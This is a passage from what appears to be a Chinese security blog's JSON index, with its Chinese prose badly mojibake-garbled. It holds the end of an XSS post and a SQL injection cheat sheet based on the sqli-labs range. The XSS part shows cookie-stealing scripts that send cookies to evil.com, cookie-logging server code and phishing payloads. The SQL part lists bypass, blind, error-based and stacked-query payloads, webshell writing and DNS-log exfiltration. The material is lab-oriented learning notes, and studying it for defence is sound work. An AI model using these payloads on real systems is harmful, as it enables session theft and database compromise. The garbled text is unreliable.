ä¸­ï¼Œæµè§ˆå™¨è®¿é—®ï¼š\n1 http://127.0.0.1/domXSS.html?a=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; å³å¯è§¦å‘ XSS æ¼æ´ã€‚\nXSSåˆ©ç”¨æ–¹å¼ Cookieçªƒå– æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è·å–å®¢æˆ·ç«¯çš„ Cookies ä¿¡æ¯ï¼š\n1 2 3 4 5 \u0026lt;script\u0026gt; document.location=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie new Image().src=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie\u0026gt;\u0026lt;/img\u0026gt; åœ¨è¿œç¨‹æœåŠ¡å™¨ï¼Œæœ‰ä¸€ä¸ªæ¥å—å’Œè®°å½•Cookiesçš„æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;% msg=Request.ServerVariables(\u0026#34;QUERY_STRING\u0026#34;) testfile=Server.MapPath(\u0026#34;cookie.txt\u0026#34;) set fs=server.CreateObject(\u0026#34;Scripting.filesystemobject\u0026#34;) set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\u0026#34;\u0026#34;\u0026amp;msg\u0026amp; \u0026#34;\u0026#34;) thisfile.close set fs=nothing %\u0026gt; 1 2 3 4 5 6 \u0026lt;?php $cookie = $_GET[\u0026#39;cookie\u0026#39;]; $log = fopen(\u0026#34;cookie.txt\u0026#34;, \u0026#34;a\u0026#34;); fwrite($log, $cookie . \u0026#34;\\n\u0026#34;); fclose($log); ?\u0026gt; æ”»å‡»è€…åœ¨è·å–åˆ° Cookies ä¹‹åï¼Œé€šè¿‡ä¿®æ”¹æœ¬æœºæµè§ˆå™¨çš„ Cookiesï¼Œå³å¯ç™»å½•å—å®³è€…çš„è´¦æˆ·ã€‚\né’“é±¼ é‡å®šå‘é’“é±¼\næŠŠå½“å‰é¡µé¢é‡å®šå‘åˆ°ä¸€ä¸ªé’“é±¼é¡µé¢ã€‚\n1 http://www.bug.com/index.php?search=\u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;document.location.href=\u0026#34;http://www.evil.com\u0026#34;\u0026lt;/script\u0026gt; HTML æ³¨å…¥å¼é’“é±¼\nä½¿ç”¨ XSS æ¼æ´æ³¨å…¥ HTML æˆ– JavaScript ä»£ç åˆ°é¡µé¢ä¸­ã€‚\n1 http://www.bug.com/index.php?search=\u0026#34;\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;login\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt; è¯¥æ®µä»£ç ä¼šåœ¨æ­£å¸¸é¡µé¢ä¸­åµŒå…¥ä¸€ä¸ª Form è¡¨å•ã€‚\niframe é’“é±¼\nè¿™ç§æ–¹å¼æ˜¯é€šè¿‡ \u0026lt;iframe\u0026gt; æ ‡ç­¾åµŒå…¥è¿œç¨‹åŸŸçš„ä¸€ä¸ªé¡µé¢å®æ–½é’“é±¼ã€‚\n1 http://www.bug.com/index.php?search=\u0026#39;\u0026gt;\u0026lt;iframe src=\u0026#34;http://www.evil.com\u0026#34; height=\u0026#34;100%\u0026#34; width=\u0026#34;100%\u0026#34;\u0026lt;/iframe\u0026gt; Flash é’“é±¼\nå°†æ„é€ å¥½çš„ Flash æ–‡ä»¶ä¼ å…¥æœåŠ¡å™¨ï¼Œåœ¨ç›®æ ‡ç½‘ç«™ç”¨ \u0026lt;object\u0026gt; æˆ– \u0026lt;embed\u0026gt; æ ‡ç­¾å¼•ç”¨å³å¯ã€‚\né«˜çº§é’“é±¼æŠ€æœ¯\næ³¨å…¥ä»£ç åŠ«æŒ HTML è¡¨å•ã€ä½¿ç”¨ JavaScript ç¼–å†™é”®ç›˜è®°å½•å™¨ç­‰ã€‚\nç½‘é¡µæŒ‚é©¬ ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ç¯¡æ”¹ç½‘é¡µçš„æ–¹å¼æ¥å®ç°çš„ï¼Œå¦‚åœ¨ XSS ä¸­ä½¿ç”¨ \u0026lt;iframe\u0026gt; æ ‡ç­¾ã€‚\nDOS ä¸ DDOS æ³¨å…¥æ¶æ„ JavaScript ä»£ç ï¼Œå¯èƒ½ä¼šå¼•èµ·ä¸€äº›æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nXSS è •è™« é€šè¿‡ç²¾å¿ƒæ„é€ çš„ XSS ä»£ç ï¼Œå¯ä»¥å®ç°éæ³•è½¬è´¦ã€ç¯¡æ”¹ä¿¡æ¯ã€åˆ é™¤æ–‡ç« ã€è‡ªæˆ‘å¤åˆ¶ç­‰è¯¸å¤šåŠŸèƒ½ã€‚\n","permalink":"http://www.reus09.top/posts/tech/xss/","summary":"ä¸»è¦å¯¹xsså¸¸è§çš„åˆ†ç±»ã€æ”»å‡»æ‰‹æ®µã€‚ä¸»è¦å‚è€ƒctf-wiki-web-xss xssæ¦‚å¿µ è·¨ç«™è„šæœ¬ï¼ˆCross-Site Scriptingï¼ŒXSS","title":"Xss"},{"content":"è¿™ç¯‡æ–‡ç« ä¸»è¦æƒ³å¯¹webæ³¨å…¥çš„æ–¹å¼è¿›è¡Œä¸€ä¸ªæ¢³ç†æ€»ç»“ï¼Œä¸»è¦é€šè¿‡é¶åœºsqli-labsè¿›è¡Œã€‚\n[TOC]\nä¸‡èƒ½å¯†ç  1 2 3 4 5 6 7 8 9 admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/\\* \u0026#39; or 1=1-- \u0026#39; or 1=1# \u0026#39; or 1=1/* \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1-- \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1-- 1\u0026#39;^1# (Falseæ³¨å…¥) å¸¸è§çš„æ˜¯å¯¹ \u0026rsquo; , \u0026quot; , ),è¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°çš„ç»•è¿‡ è”åˆæŸ¥è¯¢ æŸ¥åº“å-\u0026gt;æŸ¥è¡¨å-\u0026gt;æŸ¥åˆ—åï¼ˆå­—æ®µåï¼‰-\u0026gt;æŸ¥å€¼ï¼ˆæ•°æ®ï¼‰\næ ¹æ®å­—æ®µæ•°é‡æŸ¥ï¼šorder by 4 --+\næ ¹æ®é¡µé¢å›æ˜¾æ•°æ®å­—æ®µä½ç½®:union select 1,2,3,4,x... --+\nçˆ†æ•°æ®åº“ï¼š\n1 2 3 4 5 select database() select schema_name from information_schema.schemata; -- MySQL8æ–°ç‰¹æ€§(\u0026gt;8.0.21) table information_schema.TABLESPACES_EXTENSIONS æ ¹æ®ä¸Šé¢å¾—åˆ°çš„æ•°æ®åº“è¿›è¡Œçˆ†å¯¹åº”çš„è¡¨:\n1 union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() unionæŸ¥è¯¢:\n1 2 3 4 5 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®åº“ä¸­çš„è¡¨ */ -- MySQL 4ç‰ˆæœ¬æ—¶ç”¨version=9ï¼ŒMySQL 5ç‰ˆæœ¬æ—¶ç”¨version=10 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„è¡¨ */ SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=\u0026#39;information_schema\u0026#39; AND table_schema!=\u0026#39;mysql\u0026#39;; ç›²æ³¨:\n1 2 3 4 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables \u0026gt; \u0026#39;A\u0026#39; -- MySQL8æ–°ç‰¹æ€§ and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)\u0026gt;(BINARY(\u0026#39;a\u0026#39;),\u0026#39;0\u0026#39;)# ä¸»è¦æ˜¯é€šè¿‡å¸ƒå°”ç›²æ³¨ï¼Œä¸€ä¸ªä¸ªè¯•ï¼Œæ¯”è¾ƒåºŸæ—¶é—´,å¯ä»¥é€šè¿‡ç¼–å†™è„šæœ¬ æ—¶é—´ç›²æ³¨ï¼Œæ ¹æ®æ—¶é—´åˆ¤æ–­æˆåŠŸä¸å¦ä¹Ÿå¯ä»¥ æŠ¥é”™ï¼š\n1 2 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1))); -- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸã€‚ ä¸»è¦æ˜¯åˆ©ç”¨floorå‡½æ•°çš„æº¢å‡ºé—®é¢˜ï¼Œ é€šè¿‡contractxmlå‡½æ•°ç­‰è¿›è¡ŒæŠ¥é”™ä¹Ÿå¯ä»¥å®ç°contract(0x7e,database()) æ ¹æ®å¯¹åº”çš„è¡¨è·å–å¯¹åº”çš„åˆ—åï¼š\n1 Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*æ­¤å¤„çš„è¡¨åä¸ºå­—ç¬¦ä¸²å‹ï¼Œä¹Ÿé€šè¿‡åå…­è¿›åˆ¶è¡¨ç¤º*/ unionæŸ¥è¯¢\n1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = \u0026#39;tablename\u0026#39; ç›²æ³¨\n1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns \u0026gt; \u0026#39;A\u0026#39; æŠ¥é”™\n1 2 3 4 -- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸ AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1) -- MySQL 5.1ç‰ˆæœ¬ä¿®å¤äº† AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELE å€¼æŸ¥è¯¢\n1 2 3 4 Union select 1,2,column_name,4,xxx from (database_name.)table_name -- MySQL8æ–°ç‰¹æ€§ and (table flag limit 1,1)\u0026gt;(BINARY(\u0026#39;a\u0026#39;))# ç›²æ³¨ åŸºäºæŠ¥é”™ç›²æ³¨ é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„é”™è¯¯ä½¿ç”¨ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡ºã€‚\nå‰æï¼šæœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯ã€‚\næ¯”å¦‚(sqli.error()) å¸¸è§çš„åˆ©ç”¨å‡½æ•°æœ‰ï¼šexp()ã€floor()+rand()ã€updatexml()ã€extractvalue()ç­‰ã€‚\n1 2 3 4 5 6 (where|and|or) exp(~(select * from(select user())a)); (where|and|or) pow(~(select * from(select user())a),9999); (where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1); (where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e)); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2))); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); åŸºäºæ—¶é—´ç›²æ³¨ ä¾èµ–äºé€šè¿‡é¡µé¢è¿”å›çš„å»¶è¿Ÿæ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚\né€šå¸¸å¯åˆ©ç”¨çš„äº§ç”Ÿæ—¶é—´å»¶è¿Ÿçš„å‡½æ•°æœ‰ï¼šsleep()ã€benchmark()ï¼Œè¿˜æœ‰è®¸å¤šè¿›è¡Œå¤æ‚è¿ç®—çš„å‡½æ•°ä¹Ÿå¯ä»¥å½“åšå»¶è¿Ÿçš„åˆ¤æ–­æ ‡å‡†ã€ç¬›å¡å°”ç§¯åˆå¹¶æ•°æ®è¡¨ã€GET_LOCKåŒSESSIONäº§ç”Ÿå»¶è¿Ÿç­‰æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 -- sleep() (where | and) if(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;,sleep(3),1) select * from users where username=$username (and | or) if(length(database())\u0026gt;8,sleep(3),1) -- benchmark() or benchmark(5000000,md5(\u0026#39;test\u0026#39;)) or if(length(database())\u0026gt;5,benchmark(1500000,md5(\u0026#39;test\u0026#39;)),1) -- pg_sleep() (and | or) (case when (select substr(password,1,1) from users)=\u0026#39;a\u0026#39; then pg_sleep(5) else pg_sleep(0) end) and (select case when(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;) then (select \u0026#39;roarctf\u0026#39; from pg_sleep(3)) else \u0026#39;1\u0026#39; end)=\u0026#39;roarctf\u0026#39; -- ç¬›å¡å°”ç§¯ heavy query select * from users where id=1 and 1\u0026gt;(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C); select * from users where id=1 and if(1,concat(rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;)) RLIKE \u0026#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b\u0026#39;,0) and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;; åŸºäºå¸ƒå°”ç›²æ³¨ ä½¿ç”¨åœºæ™¯ï¼šå¯¹çœŸ/å‡æ¡ä»¶è¿”å›çš„å†…å®¹å¾ˆå®¹æ˜“åŒºåˆ†ã€‚\n1 2 3 4 5 6 7 (where | and) if(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;,1,0) select * from users where username=nouser or length(database())\u0026gt;8 select * from users where username=nouser or ascii(substr(database(),1,1))\u0026lt;130 -- é€šé…ç¬¦ select * from users where username=\u0026#39;xxx\u0026#39; and passwd=\u0026#39;-1\u0026#39; or passwd like \u0026#39;{}%\u0026#39;# åŸºäºsqlå¢åˆ æ”¹æŸ¥çš„ç›²æ³¨ updateæ³¨å…¥ 1 2 3 4 5 #ç›²æ³¨ update users set username = \u0026#39;0\u0026#39;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15; update users set username = \u0026#39;0\u0026#39; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14; insertæ³¨å…¥ 1 2 3 4 #ç›²æ³¨ insert into users values (16,\u0026#39;K0rz3n\u0026#39;,\u0026#39;0\u0026#39;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1)); insert into users values (15,\u0026#39;K0rz3n\u0026#39;,\u0026#39;0\u0026#39;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order by æ³¨å…¥ 1 2 3 4 5 #æŠ¥é”™æ³¨å…¥ select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1); #ç›²æ³¨ select * from users order by id ^(select(select version()) regexp \u0026#39;^5\u0026#39;); Group by æ³¨å…¥ 1 2 #ç›²æ³¨ select * from users group by 1 having substr((select database()),1,1)=\u0026#39;c\u0026#39; æ–‡ä»¶å†™å…¥ æˆ‘ä»¬å¯ä»¥é€šè¿‡sqlè¯­å¥å®ç°å†™å…¥webshellï¼Œä»è€Œå¯ä»¥è¿œç¨‹é€šè¿‡èœåˆ€ã€å†°èç­‰å·¥å…·å»ºç«‹è¿æ¥ã€‚ å½“ç„¶ï¼Œæ–‡ä»¶å†™å…¥çš„æ¡ä»¶æ¯”è¾ƒç‰¹æ®Š æ•°æ®åº“å½“å‰ç”¨æˆ·ä¸ºrootæƒé™ï¼› çŸ¥é“å½“å‰ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼› PHPçš„GPCä¸º offçŠ¶æ€ï¼›(é­”æœ¯å¼•å·ï¼ŒGETï¼ŒPOSTï¼ŒCookie) å†™å…¥çš„é‚£ä¸ªè·¯å¾„å­˜åœ¨å†™å…¥æƒé™ã€‚ åŸºäºè”åˆæŸ¥è¯¢ 1 2 3 SELECT 1,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;,3 into outfile \u0026#39;C:\\info.php\u0026#39;%23 ?id=1 UNION ALL SELECT 1,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;,3 into dumpfile \u0026#39;C:\\info.php\u0026#39;%23 éè”åˆæŸ¥è¯¢ å½“æˆ‘ä»¬æ— æ³•ä½¿ç”¨è”åˆæŸ¥è¯¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨fields terminated byä¸lines terminated byæ¥å†™shellï¼š?id=1 into outfile 'C:\\info.php' FIELDS TERMINATED BY '\u0026lt;?php phpinfo();?\u0026gt;'%23\nå®½å­—èŠ‚æ³¨å…¥ å›½å†…æœ€å¸¸ä½¿ç”¨çš„ GBK ç¼–ç ï¼Œè¿™ç§æ–¹å¼ä¸»è¦æ˜¯ç»•è¿‡ addslashes ç­‰å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ç§»çš„ç»•è¿‡ã€‚åæ–œæ  \\ çš„åå…­è¿›åˆ¶ä¸º %5cï¼Œåœ¨ä½ è¾“å…¥ %bf%27 æ—¶ï¼Œå‡½æ•°é‡åˆ°å•å¼•å·è‡ªåŠ¨è½¬ç§»åŠ å…¥ \\ï¼Œæ­¤æ—¶å˜ä¸º %bf%5c%27ï¼Œ%bf%5c åœ¨ GBK ä¸­å˜ä¸ºä¸€ä¸ªå®½å­—ç¬¦ã€Œç¸—ã€ã€‚%bf é‚£ä¸ªä½ç½®å¯ä»¥æ˜¯ %81-%fe ä¸­é—´çš„ä»»ä½•å­—ç¬¦ã€‚ä¸æ­¢åœ¨ SQL æ³¨å…¥ä¸­ï¼Œå®½å­—ç¬¦æ³¨å…¥åœ¨å¾ˆå¤šåœ°æ–¹éƒ½å¯ä»¥åº”ç”¨ã€‚\nGETæ–¹å¼ï¼šåˆ©ç”¨URLencode ?id=1%df'||1={payload}%23\nPOSTæ–¹å¼ï¼šåˆ©ç”¨UTF-16æˆ–UTF-32æˆ–ä¸­æ–‡ ?id=1æˆ‘'||1={payload}#\nå †å æ³¨å…¥ ç”±äºåˆ†å·;ä¸ºMYSQLè¯­å¥çš„ç»“æŸç¬¦ã€‚è‹¥åœ¨æ”¯æŒå¤šè¯­å¥æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œå¯åˆ©ç”¨æ­¤æ–¹æ³•æ‰§è¡Œå…¶ä»–æ¶æ„è¯­å¥ï¼Œå¦‚RENAMEã€DROPç­‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 1;show databases;# 1;show tables;# 1;show columns from [è¡¨å];# 1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e) /*é¢„å¤„ç†*/ 1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;# 1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;# 1\u0026#39;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;# 1\u0026#39;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# äºŒæ¬¡æ³¨å…¥ æ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚\n1 2 3 4 5 ç°åœ¨é€šå¸¸Webåº”ç”¨ç¨‹åºå¤§å¤šéƒ½ä¼šè¿›è¡Œå‚æ•°è¿‡æ»¤ï¼Œæ¥é˜²æ­¢æ³¨å…¥ã€‚å¦‚æœæŸå¤„ä½¿ç”¨äº†urldecode()æˆ–è€… rawurldecode()å‡½æ•°ï¼Œåˆ™ä¼šå¯¼è‡´äºŒæ¬¡è§£ç ç”Ÿæˆå•å¼•å·äºŒå¼•å‘æ³¨å…¥ï¼Œå³äºŒæ¬¡æ³¨å…¥ã€‚ Webåº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨addslashes() ã€mysql_real_escape_string()ã€mysql_escape_string()å‡½æ•°æˆ–è€…å¼€å¯GPCæ¥é˜²æ­¢æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯ç»™å•å¼•å·(â€˜â€™)ã€åŒå¼•å·(â€œâ€)ã€åæ–œæ ()å’ŒNULLåŠ ä¸Šåæ–œæ è½¬ä¹‰ã€‚ addslasheså‡½æ•°è™½ç„¶åœ¨è¿‡æ»¤ä¹‹åä¼šæ·»åŠ  â€œ\\â€ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ â€œ\\â€ å¹¶ä¸ä¼šè¢«å¸¦åˆ°æ•°æ®åº“ä¸­ äºŒæ¬¡urldecodeæ³¨å…¥ å•å¼•å·ï¼š%25%27\nåŒå¼•å·ï¼š%25%22\nDNS_logæ³¨å…¥ åŸç† é€šè¿‡å­æŸ¥è¯¢ï¼Œå°†å†…å®¹æ‹¼æ¥åˆ°åŸŸåå†…ï¼Œè®©load_file()å»è®¿é—®å…±äº«æ–‡ä»¶ï¼Œè®¿é—®çš„åŸŸåè¢«è®°å½•æ­¤æ—¶å˜ä¸ºæ˜¾é”™æ³¨å…¥,å°†ç›²æ³¨å˜æ˜¾é”™æ³¨å…¥,è¯»å–è¿œç¨‹å…±äº«æ–‡ä»¶ï¼Œé€šè¿‡æ‹¼æ¥å‡ºå‡½æ•°åšæŸ¥è¯¢,æ‹¼æ¥åˆ°åŸŸåä¸­ï¼Œè®¿é—®æ—¶å°†è®¿é—®æœåŠ¡å™¨ï¼Œè®°å½•åæŸ¥çœ‹æ—¥å¿—ã€‚ DNSLOGçš„ä½¿ç”¨åœºæ™¯ åœ¨æŸäº›æ— æ³•ç›´æ¥åˆ©ç”¨æ¼æ´è·å¾—å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯ç›®æ ‡å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥é€šè¿‡DNSè¯·æ±‚æŠŠæƒ³è·å¾—çš„æ•°æ®å¤–å¸¦å‡ºæ¥ã€‚ å¯¹äºsqlç›²æ³¨ï¼Œå¸¸è§çš„æ–¹æ³•å°±æ˜¯äºŒåˆ†æ³•å»ä¸€ä¸ªä¸ªçŒœï¼Œä½†æ˜¯è¿™æ ·çš„æ–¹æ³•éº»çƒ¦ä¸è¯´ï¼Œè¿˜å¾ˆå®¹æ˜“å› ä¸ºæ•°æ®è¯·æ±‚é¢‘ç¹å¯¼è‡´è¢«banã€‚ æ‰€ä»¥å¯ä»¥å°†selectåˆ°çš„æ•°æ®å‘é€ç»™ä¸€ä¸ªurlï¼Œåˆ©ç”¨dnsè§£æäº§ç”Ÿçš„è®°å½•æ—¥å¿—æ¥æŸ¥çœ‹æ•°æ®ã€‚ DNS_logå‡½æ•°è§£æ: è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚ è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetï¼ˆé™åˆ¶serveræ¥å—çš„æ•°æ®åŒ…å¤§å°å‡½æ•°ï¼Œé»˜è®¤1MBï¼‰ã€‚ å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚ ä»¥sql-labs Less-8ä¸ºä¾‹å­ï¼š\nå¯ä»¥è¾“å…¥ä»¥ä¸‹payload:http://172.16.11.54/sqli-labs/Less-8/?id=1' and load_file(concat(\u0026quot;\\\\\\\\\u0026quot;,database(),\u0026quot;.uifm3e.dnslog.cn\\\\xxx.txt\u0026quot;))--+\nç»•è¿‡ ç©ºæ ¼ å¤šå±‚æ‹¬å·åµŒå¥— æ”¹ç”¨+å· ä½¿ç”¨æ³¨é‡Šä»£æ›¿ï¼ˆ/æ³¨é‡Šå†…å®¹/ã€/! MYSQLä¸“å±/ï¼‰ and/oråé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª!ã€~å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨(è§„å¾‹åˆä¸åŒ)ï¼Œand/orå‰çš„ç©ºæ ¼å¯ç”¨çœç•¥ %09, %0a, %0b, %0c, %0d, %a0ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼ å•åŒå¼•å· éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥ã€‚ ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨16è¿›åˆ¶è¡¨ç¤ºã€ä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ã€‚ 1 2 3 4 -- hex ç¼–ç  SELECT * FROM Users WHERE username = 0x61646D696E -- char() å‡½æ•° SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) é€—å· é‡‡ç”¨ substr((database())from({})for(1)) çš„å½¢å¼ é‡‡ç”¨joinï¼šunion select * from ((select 1)a join (select 2)b join (select 3)c); ç­‰å· like ç”¨regexpæˆ–è€…in \u0026lt;\u0026gt; and / or åŒå†™ananddã€oorr ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿\u0026amp;\u0026amp;ã€|| ç›´æ¥æ‹¼æ¥=å·ï¼Œå¦‚ï¼š?id=1=(condition) å…¶ä»–æ–¹æ³•ï¼Œå¦‚ï¼š?id=1^(condition)ã€?id=1)xor(condition) union ç›²æ³¨ï¼š'and(select pass from users limit 1)='secret ","permalink":"http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/","summary":"è¿™ç¯‡æ–‡ç« ä¸»è¦æƒ³å¯¹webæ³¨å…¥çš„æ–¹å¼è¿›è¡Œä¸€ä¸ªæ¢³ç†æ€»ç»“ï¼Œä¸»è¦é€šè¿‡é¶åœºsqli-labsè¿›è¡Œã€‚ [TOC] ä¸‡èƒ½å¯†ç  1 2 3 4 5 6 7 8 9 admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/\\* \u0026#39; or 1=1-- \u0026#39; or 1=1# \u0026#39; or","title":"Sqlæ³¨å…¥"},{"content":"å¤§å››äº†ï¼Œæœ€è¿‘ä¸€ç›´åœ¨æ‘†çƒ‚ï¼Œå› ä¸ºä¹‹å‰å­¦ä¹ 